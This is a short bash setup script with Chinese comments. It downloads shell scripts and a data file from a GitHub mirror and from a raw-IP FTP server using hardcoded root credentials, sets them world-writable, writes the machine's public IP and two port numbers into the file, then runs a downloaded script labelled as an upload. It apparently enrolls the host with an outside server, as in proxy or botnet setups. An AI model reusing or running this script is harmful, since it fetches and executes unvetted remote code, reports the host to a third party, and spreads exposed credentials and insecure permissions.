#!/bin/bash
yum install expect -y
yum install -y ftp
wget https://raw.fastgit.org/50801684/-/master/5.sh
wget ftp://159.75.133.49:21/llh/file.txt --ftp-user=root --ftp-password=wsywsy
wget https://raw.fastgit.org/50801684/-/master/7.sh
wget ftp://159.75.133.49:21/llh/8.sh --ftp-user=root --ftp-password=wsywsy
wget https://raw.fastgit.org/50801684/-/master/4.sh
sudo chmod 777 *.sh
sudo chmod 777 file.txt
# 写入IP
Server_IP=`curl ifconfig.me`
echo $Server_IP":29999" >> file.txt
echo $Server_IP":39999" >> file.txt
echo "" >> file.txt
# 上传
sh 8.sh


